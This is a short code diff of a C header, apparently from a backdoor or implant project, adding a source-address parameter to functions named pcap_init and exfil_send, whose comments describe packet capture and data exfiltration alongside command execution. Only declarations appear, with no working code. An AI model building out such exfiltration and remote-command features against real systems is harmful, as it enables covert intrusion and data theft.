@@ -28,7 +28,7 @@
  * NOTES: Call this function to start libpcap packet capture and exfiltration functions.
  *
  */
-void pcap_init(uint32 ipaddr, char *folder, int chan);
+void pcap_init(uint32 src, uint32 ipaddr, char *folder, int chan);
 
 /**
  * FUNCTION: cmd_execute
@@ -113,7 +113,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
  *
  */
 
-void exfil_send(uint32 ipaddr, char *path);
+void exfil_send(uint32 src, uint32 ipaddr, char *path);
 
 /**
  * FUNCTION: exfil_watch
